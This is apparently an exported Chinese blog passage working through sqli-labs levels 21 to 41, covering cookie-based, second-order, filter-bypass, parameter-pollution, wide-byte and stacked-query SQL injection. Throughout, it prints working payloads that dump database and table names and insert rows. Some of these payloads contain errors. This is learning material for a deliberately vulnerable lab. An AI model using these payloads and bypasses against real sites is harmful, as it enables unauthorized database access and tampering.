    <content><![CDATA[<h3 id="接下来是第二部分的21关"><a href="#接下来是第二部分的21关" class="headerlink" title="接下来是第二部分的21关"></a>接下来是第二部分的21关</h3><p>其实感觉和第20关没有多大差别，我们看看源码吧  发现还是有点差别的 比如说：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201128010643.png" alt="img" style="zoom: 80%;"></p>
<p>有一个**$cookee = base64_decode($cookee);**<br>好像是将cookee给编码解密了，说明前面肯定还有一个加密，我们用burp suit抓包试试  <a id="more"></a><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201128011006.png" alt="img"></p>
<p>果不其然 他的cookee被加密了 我们直接网页搜索解密软件 然后发现结果是 admin<br>然后我们利用这里来注入一下 看下源代码 发现是’)单引号组合括号的 ，然后我直接输入’) and 1=1# 发现他报错了</p>
<p><strong><em>\</em>Issue with your mysql: Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (utf8mb4_0900_ai_ci,COERCIBLE) for operation ‘=’**</strong>有点奇怪 我们再来看看源代码</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201128013136.png" alt="img"></p>
<p>可以发现这边这个使用的是encode<br><strong>base64_encode是加密,而base64_decode是解密</strong><br>所以我们来思考一下他代码是如何运行的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201130183734.png" alt="img" style="zoom:50%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201130183733.png" alt="img" style="zoom:67%;">

<p>他是这样的 如果账号密码正确 则保存你此时的cookies，并且加密发送，所以我再burp suit抓包的时候，抓到的用户名就是加密的，然后跳转到下一个页面，在这个页面中要利用cookies输出账号密码，所以他又解码输出了，而这个时候如果我们要利用burp suit修改cookies的数据达到注入的目的，我们就需要将我们的注入语句也进行加密，这样他解密以后才会被mysql识别并执行命令。OK  大概了解整个运转过程后，我们寻找注入点<br>发现在下面 有个’）单引号加括号的注入点，然后我们在burp suit注入试试<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201130184857.png" alt="img">uname后面的那串东西是1’)and extractvalues(1,concat(‘<del>‘,database(),’</del>‘))# 经过base64位编码以后的结果</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201130184652.png" alt="img"></p>
<p>这个又是什么神仙报错？？？？  但是我们可以看到有个security 我们数据库的名字的出现 但是为了避免不是偶然我们再试试看，我无语了 <strong>原来是我函数名输错了，应该是extractvalue</strong> 所以正确的界面应该是</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201130185526.png" alt="img" style="zoom:67%;">

<p>OK  利用报错注入成功</p>
<h2 id="第22关"><a href="#第22关" class="headerlink" title="第22关"></a>第22关</h2><p>这一题和上一题又有点不一样，题目说是基于双引号的注入<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201130190241.png" alt="img"><br>但我们从这个语句可以发现，他不是直接在select里面添加双引号 而定义一个$cookee1 并且这个cookee1=”$cookee”<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201130190900.png" alt="img"><br>其实按照php的语法上面那个其实可以等价为下面那个，但是我不知道他为啥要这样操作？更安全吗？<br>然后就直接把上一题的单引号和括号换成双引号就行，其他的没啥区别</p>
<h2 id="23关"><a href="#23关" class="headerlink" title="23关"></a>23关</h2><p>23关 又回到了以前熟悉的界面 但是好像跟之前的有不太一样，因为加了单引号报错 加了双引号和and1=1 and1=2 却不报错 让我们再来研究一下源码<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201130195221.png" alt="img"><br>这里介绍一个函数<br><strong>preg_replace</strong>替换函数<br>preg_replace 函数执行一个正则表达式的搜索和替换。<br><strong>语法</strong>：<br>preg_replace(要替换的东西，替换成啥东西，哪个里面的东西需要替换);<br>知道这个以后我们不难发现，再上面这个代码中 我们的注释符需要替换。 那么注释符被替换我们该如何实现注入呢？<br>我们要回归<strong>使用注释符的本质</strong>：没加注释符前后面的语句因为没有闭合所以会报错，所以我们加了注释符直接让其消失就好了，而现在没了注释符，我们就需要将语句闭合起来，使其不报错，叫做<strong>单引号闭合绕过</strong>这个其实之前遇到过 加了超级多引号，我看太麻烦就没去试，今天看来不得不试了！！！<br>在之前更正的原理中，我们知道了闭合单引号的真相，所以这关现在就显得很简单了<br><strong>有个问题</strong>：为啥order by 在这里好像不管怎么放置都是错误的，这就很纳闷了？？order by 后面加数字，加字段名都是可以的，但是字段名是不可以带引号的，意思是让这个列排序，但是因为单引号闭合后里面的数字变成字符串了这就产生了语法错误。</p>
<p>更本质的说法是：不只order by，凡是字符串但又不能加引号的位置都不能参数化；包括sql关键字、库名表名字段名函数名等等<br>来自46关的一个补充纠错</p>
<p><strong>payload：</strong>?id=-1’union select 1,database(),’3 这个时候数据库就出来了<br><strong>payload：</strong>?id=-1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’ or’1=1<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201130213549.png" alt="img" style="zoom:67%;"></p>
<h2 id="第24关"><a href="#第24关" class="headerlink" title="第24关"></a>第24关</h2><p>这关就和之前的很不一样了<br>查阅资料后 知道一件事：<strong>SQL注入一般分为两类：一阶SQL注入（普通SQL注入），二阶SQL注入</strong><br><strong>什么是二阶注入</strong>：<br>1.构造带有注入语句的危险payload1数据，在http请求中提交到服务器当中，该数据会被服务器存储到数据库当中<br>2.当我们要修改该payload1数据的时候，程序在检索存储payload1的数据库的时候将会造成SQL注入，如果攻击成功，在第二次响应中返回结果<br>3.也称为存储型注入，将可能造成sql注入的语句存储到数据库中，当再次调用该数据的时候，就可能发生SQL注入。<br>先来看看源码<br>先从index.php看起：一开始就是一个session_start()函数<br><strong>seession</strong>：<br><a href="https://blog.csdn.net/zhengxijia2012/article/details/73437376">https://blog.csdn.net/zhengxijia2012/article/details/73437376</a><br>谈谈我的理解，为什么我们一开始cookies可以在多个页面保存使用，就是因为有这个session函数发挥作用<br>然后在其他源码中，我们不难发现，基本上每个数据都有过滤操作，但是我发现 在pass_change的时候，他的username是没有过滤操作的<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201201115020.png" alt="img"><br>如上，在下面的update语句中 username是直接从数据库被调用的，这就意味着我们可能可以通过这个数据进行注入（二阶注入），如果我们要利用这点，也就是说我们必须有数据是带有危险字符的存储在数据库当中，那么接下来，我们需要在数据库中构建这样一个数据，从上面的代码中我们发现他的username是用单引号闭合的，所以我们需要构建一个单引号注入的数据——admin’# ，这里有个<strong>问题</strong>：不是被转义了吗，为啥在数据中还会以单引号的形式存在，这是因为转义只是暂时的，存储以后还是以单引号的形式存在的<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201201004552.png" alt="img" style="zoom:67%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201201004553.png" alt="img" style="zoom:67%;"> 

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201201004554.png" alt="img" style="zoom:67%;">
接下来我们研究一下 为啥可以更改
原SQL语句：
UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass'
修改密码的SQL语句：
update users set password='$pass' where username='$username' and password='$curr_pass'
最后真正执行的sql语句：
update users set password=='$pass' where username='admin'
但是这个具有一定的局限性，就是说，我们只能修改特定的用户的密码，比如说我想修改上表中的dumb，那么我就得在创建一个dumb'#的数据存储在数据库当中。
接下来我们看看有没有其他攻击手法：
**1报错注入：**
![img](https://raw.githubusercontent.com/Hwwg/myphoto/master/20201201122617.png)

<p>有错就die网页，so 报错注入不行<br><strong>2.延时注入</strong><br>有字符数限制，所以不行</p>
<h2 id="第25关"><a href="#第25关" class="headerlink" title="第25关"></a>第25关</h2><p>首先看一下源代码：发现定义了blacklist()函数<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201201124258.png" alt="img"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201201124257.png" alt="img"><br>作用如下，就是过滤掉 or 和and，那么我们该如何绕过呢？<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201201124851.png" alt="img"><br>看到这个我们就知道是单引号注入，接下来我试着构建payload试试<br>从那个preg_replace函数中我们可以看出，他是将or转义成啥都没有，所以有一种思路是，在and里面插入and 转义完后即可留下我们本来的语句<br>所以<strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;aandnd 1&#x3D;2 --+</span><br><span class="line">?id&#x3D;1&#39;oorrder by 3 --+</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201201125357.png" alt="img" style="zoom: 67%;">
OK  绕过成功  然后我们只需要用order by 查询字符段数目，然后union拼接一下语句即可绕过。
这里出现了一个$hint=$id; 然后最后又return了一个i$id，所以我们可以知道,$hint是用来储存存放数据的，作用是更方便，不过这也让我们知道我们输入的语句到程序里面会变成啥样的。

<p><strong>其他绕过方法</strong><br>绕过思路：<br>（1）大小写变形 Or,OR,oR<br>（2）编码，hex，urlencode<br>（3）添加注释/or/<br>（4）利用符号 and=&amp;&amp; or=||<br>（5）双写绕过<br><a href="https://blog.csdn.net/qq_42181428/article/details/105061424?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-3.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-3.control">https://blog.csdn.net/qq_42181428/article/details/105061424?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-3.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-3.control</a> 这个是关于绕过的以及CTF题目的一篇文章，感觉还挺厉害</p>
<p>我又没保存博客人傻了——-<br>第25关a和25关没多大区别</p>
<h2 id="26关"><a href="#26关" class="headerlink" title="26关"></a>26关</h2><p>先研究一下源代码</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201201155743.png" alt="img"></p>
<p>首先是一个新函数<br><strong>fopen()函数</strong><br>fopen()函数用于打开文件文件或者URL，<br><strong>语法</strong>:<br>fopen(filename,mode,include_path,context)<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201201155935.png" alt="img"><br>而在这个里面的意思是 打开那个txt然后写入数据。<br>我们接着往下看<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201201160042.png" alt="img"></p>
<p>在这关当中，他过滤了很多东西 我们依次来看看吧，分别是：</p>
<p>三种注释符，空格，还有反斜杠，还有and，or（<strong>这里要特别注意information里面有个or所以也会被过滤， 所以在注入的时候记得注意也要双写</strong>）<br>好了 接下来我们开始试着绕过：<br>1.因为空格被过滤了，所以我们可以采取是用括号的方式绕过这个过滤<br>2.由于注释符过滤，除了用一些特殊的字符代表注释符，我们这里先采用闭合单引号的方式绕过，那么我们知道，单引号内的内容会被转变成字符串，所以有用到数字的方法在这里都行不通，使用union拼接语句的时候，可以获取到数据库，但是再往下由于要使用limit所以也不行了，所以这里我们采取报错注入的方式：<br>构建payload：<br>//<strong>?id=1’aandnd(extractvalue(1,concat(‘<del>‘,database(),’</del>‘)))aandnd’1’=’1</strong>//<br>//<strong>?id=1’aandnd(extractvalue(1,concat(‘<del>‘,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)=’security’),’</del>‘)))aandnd’1’=’1</strong>//<br> <img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201201192222.png" alt="img" style="zoom: 50%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201202132344.png" alt="img" style="zoom:67%;"></p>
<h2 id="第26a关"><a href="#第26a关" class="headerlink" title="第26a关"></a>第26a关</h2><p>这关和26关没有多大区别，唯一区别是这里需要采取单引号+括号的形式来注入<br>还是有其他区别的，比如在这关当中，他是不输出报错信息的，并且因为是采取单引号+括号闭合方式进行注入的，如果我们想要时间盲注的方式，也不太行因为闭合以后，单引号加括号里面的内容就会变成字符，跟之前用不了order by是一个意思。<br>查了一下好像确实只能用%a0进行绕过了，然后接下来需要安装一下虚拟机</p>
<h2 id="第27关"><a href="#第27关" class="headerlink" title="第27关"></a>第27关</h2><p>这关过滤的是<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201202193040.png" alt="img" style="zoom:67%;"><br>这关过滤的有如下内容，但是我们可以发现，这次没有过滤and但是过滤了select和union还有注释符那些<br>然后我们可以发现，这一次的正则表达式和前面几个又有点不太一样，反斜杠后面又多了一些字母<br>作用如下：</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201202195735.png" alt="img" style="zoom:67%;">

<p>资料来源：[<a href="https://www.baidu.com/s?rsv_op=c2KYgWdLVYcV2R3VPVh1WafSTX6XL0b2NMNbgbbP5faVPMWOgMNVVPSOQOU9XXcQghM678gVQZ9QeQaJYeYWeIR0335XMNab436TIP42cPUMd06IThM4hLJa&amp;wd=fopen%E5%87%BD%E6%95%B0&amp;ie=utf-8&amp;tn=49055317_3_hao_pg%5D">https://www.baidu.com/s?rsv_op=c2KYgWdLVYcV2R3VPVh1WafSTX6XL0b2NMNbgbbP5faVPMWOgMNVVPSOQOU9XXcQghM678gVQZ9QeQaJYeYWeIR0335XMNab436TIP42cPUMd06IThM4hLJa&amp;wd=fopen%E5%87%BD%E6%95%B0&amp;ie=utf-8&amp;tn=49055317_3_hao_pg]</a></p>
<p><a href="https://blog.csdn.net/onthewaygun/article/details/10009021?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-1.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-1.control%E6%A0%B9%E6%8D%AE%E4%BB%A5%E4%B8%8A%E8%B5%84%E6%96%99">https://blog.csdn.net/onthewaygun/article/details/10009021?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-1.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-1.control根据以上资料</a> 我们可以知道，这次的正则表达式替换的更加牛，他是一直在替换，就是说不能双鞋，因为你双写完以后替换过一遍，待会还会再替换一次，所以这里我们只能采用大小写混搭的方式进行注入<br>//刚刚居然崩溃了–导致没保存。。成年人的崩溃就在一瞬间。。。。。。//</p>
<p>那我们接下来构建payload：<br>?id=1’and(extractvalue(1,concat(‘<del>‘,database(),’</del>‘)))and’1=1<br>?id=1’and(extractvalue(1,concat(‘<del>‘,(seLeCt(group_concat(table_name))from(table_schema))=’security’),’</del>‘)))and’1=1<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201202213910.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201203122737.png" alt="img" style="zoom: 50%;"></p>
<p>下面也是这样的一套组合拳，其实我发现，我们可以利用报错注入的原因是在报错注入的时候我们可以将所有数据一起报错出来（group_concat）函数，但是当只能使用时间盲注的时候就没办法了，因为都是需要数字说明截取。<br>这里有个问题，为什么在下面的查询语句中or无法报错，但是and可以报错</p>
<p>27a关因为无报错信息所以只好采取时间盲注或者union select联合注入，然后就需要用到特殊转义字符。。<br>开始搭linux系统</p>
<h2 id="第28关"><a href="#第28关" class="headerlink" title="第28关"></a>第28关</h2><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201203124541.png" alt="img" style="zoom:67%;">

<p>感觉还是需要使用linux系统进行操作会比较方便一些，用括号的方式进行闭合太累了<br>28a关也和这个差不多</p>
<p>小结一下：<br>1.最近做的都是被过滤的题目，要如何绕过过滤方法也就是这几种似乎也没啥好说的了–<br>2.然后源代码的学习挺有用的，感觉看源代码对于整个过程会更了解一些，然后注入的过程也更有感触了。<br>参考链接：<a href="https://www.cnblogs.com/forforever/p/13764024.html">https://www.cnblogs.com/forforever/p/13764024.html</a></p>
]]></content>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlilabs7</title>
    <url>/2020/12/03/sqlilabs7/</url>
    <content><![CDATA[<h1 id="第29关"><a href="#第29关" class="headerlink" title="第29关"></a>第29关</h1><p>首先研究一下源代码<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201203183137.png" alt="img" style="zoom:67%;"><br>首先是这个<br>$_SERVER[‘QUERY_STRING’]<br>作用：获取？后面的值<br><a href="https://www.cnblogs.com/mitang/p/3874291.html">https://www.cnblogs.com/mitang/p/3874291.html</a> 学习链接                  <a id="more"></a><br>然后去查阅了一下资料，这关原来是有两个服务器在共同作用<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201203205202.png" alt="img"></p>
<p>一个是Apache另一个是Tomcat  所以我的理解是，tomcat先对接受的数据进行过滤处理然后再交由apache（PHP），但其实我们可以看出<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201203211120.png" alt="img" style="zoom:67%;"><br>在这个里面，也就是看看是否带数字，如果是的话就把这个数据传递给Apache，没有怎么进行过滤的感觉呀？<br>原来使我们理解错了，这个的意思是：从get的id里面匹配以整数结尾的数据，如果我们在这个id 中插入我们的注入语句，那么匹配就会返回false，因为不是以整数结尾，这个过滤很强啊，相当于一个waf那么我们该如何绕过呢？</p>
<p><strong>HPP（HTTPParameterPollution）</strong><br>利用这个在前面那张图中，我们得知tomcat是取第一个数据，apache是取第二个数据，并且apache才是处理我们数据并且输出的服务器，所以我们可以构造两个数据，让tomcat只取得第一个合法数据，而第二个危险语句就让apache处理，达到我们的注入效果。<br>接下来构建payload：<br>?id=1&amp;?id=-2’union select 1,database(),3 –+<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201203214846.png" alt="img" style="zoom:67%;"><br>即可成功绕过</p>
<h2 id="第三十二关"><a href="#第三十二关" class="headerlink" title="第三十二关"></a>第三十二关</h2><p><strong>宽字符注入问题</strong><br>还是先来分析一下源代码<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201205162208.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201205162209.png" alt="img"><br>在这个题目当中，我们可以发现 他对get的的id进行了过滤，这里一开始有个疑问，他这边是对$string 而在下面的时候是对get[$id]  但是其中也没有让$string=这个get的命令。后来发现 在函数中其实get的这个数据就直接等于这个$string了 然后这边过滤的有反斜杠和单引号<br>第一句是当中出现的<br><strong>preg_quote()**定义和用法<br>preg_quote()需要参数 str 并向其中 每个正则表达式语法中的</strong>字符**前增加一个反斜杠<br>然后接下来的两个是为了避免你想加一个反斜杠把上一个反斜杠给注释掉而写进去的</p>
<p>那么我们再往下看 看到一个<strong>set names gbk：</strong><br>可以再在建数据库的时候设置，也可以在创建表的时候设置，或只是对部分字段进行设置，而且在设置编码的时候，这些地方最好是一致的，这样能最大程度上避免数据记录出现乱码</p>
<p>在这个语句中的意思是 对$con1进行 set names gbk编码<br>然后gbk是两个字节作为一个汉字，而uft-8是三个字节作为一个汉字，例如%aa%5c就是一个汉字（前一个ascii码大于128才能到汉字的范围，两个字节才能形成文字）</p>
<p>那么我们如何实施注入呢，先把流程搞一遍：<br>输入数据-&gt;进行过滤-&gt;对数据进行gbk编码-&gt;代入查询-&gt;输出结果<br>接下来 攻击流程：<br>输入带有危险字符的数据-&gt;进行过滤添加了反斜杠-&gt;对数据进行gbk编码(输出的ascii码大于128的字符转码以后和前面的转码后的反斜杠形成文字，只剩下单引号)-&gt;代入查询（执行(危险的)sql语句）-&gt;输出结果<br><strong>PS：</strong>iconv()进行编码转换的时候，也可能存在宽字符注入漏洞<br>我们使用ascii码大于128的有一个%aa和%df<br><strong>构建payload</strong>:?id=1%a0’and 1=1 –+<br>                        ?id=-1%aa’union select 1,database(),3 –+<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201205175219.png" alt="img" style="zoom:80%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201205175321.png" alt="img" style="zoom:67%;"><br>为啥那边会变成乱码呢，因为windows系统不支持ascii大于128的显示<br>下一个payload：<br>?id=-1%a0’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’ –+<br><strong>这个语句是不行的，因为单引号被过滤了，所以我们需要将security编码</strong><br>正确语句是：<br>?id=-1%a0’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479 –+<br>因为<strong>mysql支持十六进制的数值，所以我们这里直接将数据转为16进制即可（0x表示16进制）</strong></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201205181207.png" alt="img" style="zoom: 33%;">
**补充知识**
1.字符、字符集
字符(character)是组成字符集(character set)的基本单位。对字符赋予一个数值(encoding)来确定这个字符在该字符集中的位置。
2.UTF8
由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF(Universal Transformation Format)。

<p>3.宽字节<br>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。<br><strong>MYSQL的字符集转换过程</strong></p>
<p>1.MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection;</p>
<p>2.进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：</p>
<ul>
<li>使用每个数据字段的CHARACTER SET设定值;</li>
<li>若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准);</li>
<li>若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值;</li>
<li>若上述值不存在，则使用character_set_server设定值。</li>
</ul>
<p>将操作结果从内部操作字符集转换为character_set_results。<br>重点：宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。<br>PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。<br><strong>一点小体会</strong><br><strong>1</strong>.只有存在转义函数以及gbk编码的时候 才会出现宽字节注入，为什么呢？其实想一下，只有在我们输入单引号，然后函数转义给我们添加了反斜杠，这个时候我们输入ascii大于128的字符能达到吃字符，让单引号逃逸的效果。<br>三十三关和上一关没多大区别，在看源码的过程中唯一的区别就在于三十三关使用的是addslashes进行转义<br> 无多大区别</p>
<h3 id="第三十四关"><a href="#第三十四关" class="headerlink" title="第三十四关"></a>第三十四关</h3><p>这是一个post请求方式，在URL上面直接输入和在框里输入是不太一样的<br>这里再来系统的了解一下一些编码的知识吧<br><a href="https://www.cnblogs.com/fnlingnzb-learner/p/6163205.html">https://www.cnblogs.com/fnlingnzb-learner/p/6163205.html</a><br>在这里我想在区分一下在啊url输入和在下面框里输入的区别：<br>在上面的url输入的时候，如果你输入的时候 如果你已经输入的是一个符合url编码的格式的时候，他就不会理你，直接原样发送数据，但是当你在下面的框框的输入的时候，%会在经过一次编码变成%25 所以如果我们在下面的框框也是采用同样的输入方式的时候就会出错，那么该如何解决呢？<br><strong>法1:</strong><br>我们依旧可以按照做33关的方式输入，只需要用burp suit抓包把多编码的那个25删除即可</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201205205722.png" alt="img" style="zoom:67%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201205205812.png" alt="img" style="zoom:67%;">
删掉25 即可得到
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201205205911.png" alt="img" style="zoom:67%;">

<p><strong>方法2</strong>：<br>经过一番探索，终于弄明白了<br>一个字符代表几个字节在不同的编码下是不一样的<br>UTF-16编码：一个英文字母字符或一个汉字字符存储都需要2个字节（Unicode扩展区的一些汉字存储需要4个字节）。<br>UTF-8编码：一个英文字符等于一个字节，一个中文（含繁体）等于三个字节。中文标点占三个字节，英文标点占一个字节<br>Unicode编码：一个英文等于两个字节，一个中文（含繁体）等于两个字节。中文标点占两个字节，英文标点占两个字节。<br>url编码就是在uft-8编码的基础上，给编码的每个字节加上百分号</p>
<p>所以POST的请求中，数据的编码过程是这样变化的：当我们一开始输入的是汉字，那么会被先被uft-8编码，然后在被加上百分号就是url编码了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201205213655.png" alt="img" style="zoom:50%;"><br>当然也存在uft-16的编码方式，在这里我们输入这个数据：<br>**’1雲&#39;or 1=1 #’ ** 抓包 </p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201205213932.png" alt="img"><br>得到这个数据，我们可以知道这个汉字被转化为三个字节，，也就是uft-8编码。在传输到数据库里面，并且对单引号%27添加转义反斜杠，再被gbk编码，而这里我们这里我们知道，在gbk中两个字符就会被当成一个汉字，那么我们原本输入一个汉字，这个汉字被转化成三个字节，加上原本的单引号一共四个字节，当转义字符插入，就变成了五个字节，这个时候单引号依旧可以逃逸出。<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201205214513.png" alt="img">其实我觉得宽字节注入的核心在于：利用gbk编码的两个字符吃掉转义字符反斜杠，使得单引号逃逸出（前面好像说过了，但是现在更加明了哈哈哈哈哈）<br><strong>方法3</strong>：<br>我们知道输入的数据会被编码为uft-8，然后被url编码，那么如果我们直接将其转化成uft-8，那么是不是也可以实现注入呢答案是不会，因为没有自动识别功能~<br><a href="https://www.qqxiuzi.cn/bianma/Unicode-UTF.php">https://www.qqxiuzi.cn/bianma/Unicode-UTF.php</a><br>这是一个可以转码的网址<br>OK 接下来就是暴表 啥的 组合拳冲了</p>
<p>补充知识：<br>了解整个编码解码过程：<br><a href="https://www.freebuf.com/column/165567.html">https://www.freebuf.com/column/165567.html</a></p>
<h2 id="第35关"><a href="#第35关" class="headerlink" title="第35关"></a>第35关</h2><p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201205215755.png" alt="img"><br>这关属实有点搞笑，转义却在id这里不加引号，直接构造payload就行了，然后后面需要security在转码一下就行</p>
<h2 id="第36关"><a href="#第36关" class="headerlink" title="第36关"></a>第36关</h2><p>这一关依旧是需要利用get宽字节注入 不过这关使用的转义函数是mysqli_real_escape_string()；<br>直接构造payload：?id=-1%a0’union select 1,database(),3 –+<br>下面就是组合拳了</p>
<p>第37关</p>
<p>和前面的post宽字节注入无多大区别，不过用得是mysqli_real_escape_string(),payload都没变</p>
<h2 id="第38关"><a href="#第38关" class="headerlink" title="第38关"></a>第38关</h2><p>先研究一下源代码<br><strong>mysqli_connect()函数</strong><br>打开一个到 MySQL 服务器的新的连接。<br><strong>语法</strong>：mysqli_connect(<em>host,username,password,dbname,port,socket</em>)；<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201206145711.png" alt="img" style="zoom:67%;"></p>
<p><strong>mysqli_select_db（）</strong><br>作用：用于更改连接的默认数据库。<br>mysqli_select_db(<em>connection,dbname</em>)<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201206150352.png" alt="img"><br><strong>mysqli_multi_query()</strong><br>mysqli_multi_query(<em>connection,query</em>)；<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201206162905.png" alt="img" style="zoom:67%;"></p>
<p><strong>mysql_store_result()函数</strong><br>用于将mysqli_query()查询的结果集存储到变量中<br><strong>mysqli_more_results</strong>();<br>mysqli_more_results(connection);<br>参数：connection：必需。规定要使用的mysql连接<br>功能，检查一个多查询是否有更多的结果。<br>也没看到有啥过滤的代码<br>然后看到id被单引号包裹，所以先试试常规操作吧<br>利用union拼接select即可获得数据<br>mysqli_multi_query()还是让人比较在意的，所以看看标题，原来这是让我们尝试堆叠注入的<br><strong>堆叠注入原理</strong>：<br>字面意思就是多条语句一起执行。如何实现？我们都知道在mysql中，每一条语句结尾加分号（；）表示语句的结束，基于此，如果我们在执行完一条语句之后继续构造下一条语句，中间用分号表示前一条语句的结束，那么我们的语句的实现也就成为了可能。</p>
<p><strong>和union的区别</strong>：union执行的语句是有限的，只能用来执行查询语句，而堆叠注入可以是任意的语句<br><strong>局限性</strong>：由于是第二条语句，所以页面是不会回显的，所以我们在前端页面无法看到返回结果，所以，在读取查询数据时，我们建议使用union（联合）注入，同时在使用堆叠注入之前，我们大多数时候也是需要一些数据库相关信息的，例如表名，列名字，当然API或者数据库（Oracle数据库）引擎不支持的限制下，也可能限制不足<br>如果没有mysli_multi_query()的时候我们可以使用堆叠注入吗？<br>答案是不行，因为此时无法处理多条语句。（局限性之一）<br>构建<strong>payload</strong>：’;insert into users(id,username,password) values(5,’admmm’,’admmm’) –+<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201208171429.png" alt="img" style="zoom:67%;"><br>插入成功，那么delete等危险操作也是可以实现的，如果更改的是管理员的账户，那操作空间还蛮大的，<br>可是过于局限了。</p>
<h2 id="第39关"><a href="#第39关" class="headerlink" title="第39关"></a>第39关</h2><p>数字型注入 引号都不用加，直接注入就行了</p>
<h2 id="第40关"><a href="#第40关" class="headerlink" title="第40关"></a>第40关</h2><p>单引号加括号的闭合方式’)  既可以采取union闭合的方式，也可以用堆叠注入</p>
<p>但是错误不会回显，无法用报错注入</p>
<h2 id="第41关"><a href="#第41关" class="headerlink" title="第41关"></a>第41关</h2><p>这个是数字型注入，和第三十九关差不多但是无法使用报错注入因为报错也不回显。</p>
